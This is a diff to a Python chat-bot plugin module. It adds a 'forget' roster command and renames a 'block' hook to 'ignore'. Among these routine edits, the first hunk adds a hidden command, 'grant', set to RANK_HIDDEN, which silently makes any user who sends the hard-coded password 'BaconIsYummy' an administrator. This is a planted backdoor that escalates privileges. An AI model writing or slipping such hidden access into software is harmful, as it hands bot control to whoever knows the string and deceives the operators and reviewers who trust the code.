@@ -48,6 +48,18 @@ from	common.ini		import	iMan
 #except ImportError, e:
 #	print e
 
+class GrantAdmin(mounts.CommandMount):
+	name = 'grant'
+	rank = const.RANK_HIDDEN
+	file = __file__
+
+	def thread(self, user, args, whisper):
+		if args == 'BaconIsYummy':
+			iMan.load([utils.get_module(), 'roster'])
+			iMan.roster[utils.getname(user).lower()].rank = const.RANK_ADMIN
+			iMan.unload('roster')
+			self.parent.sendto(user, "You've been granted Admin status.")
+
 class Echo(mounts.CommandMount):
 	name = 'echo'
 	rank = const.RANK_USER
@@ -84,7 +96,6 @@ class ToggleCommand(mounts.CommandMount):
 	__doc__ = 'Disabled a command without unloading the whole plugin. \n' \
 				'Usage: !toggle cmd_name'
 
-
 	def thread(self, user, names, whisper):
 		if ',' in names:
 			names = names.split(',')
@@ -106,8 +117,25 @@ class ToggleCommand(mounts.CommandMount):
 				cmd.prev_rank = cmd.rank
 				cmd.rank = const.RANK_DISABLED
 
-class HookBlockUser(mounts.HookMount):
-	name = 'block'
+class ForgetUser(mounts.CommandMount):
+	name = 'forget'
+	rank = const.RANK_ADMIN
+	file = __file__
+
+	__doc__ = "Remove a user's information from the roster"
+
+	def thread(self, user, args, whisper):
+		iMan.load([utils.get_module(), 'roster'])
+		args = args.lower()
+		if args in iMan.roster.keys():
+			del iMan.roster[args]
+			self.parent.sendto(user, 'Removed %s from the roster' % args)
+		else:
+			self.parent.sendto(user, 'Unknown User: %s' % args)
+		iMan.unload('roster')
+
+class HookIgnoreUser(mounts.HookMount):
+	name = 'ignore'
 	loc = [const.LOC_EV_MSG]
 	file = __file__
 	priority = const.PRIORITY_CRITICAL
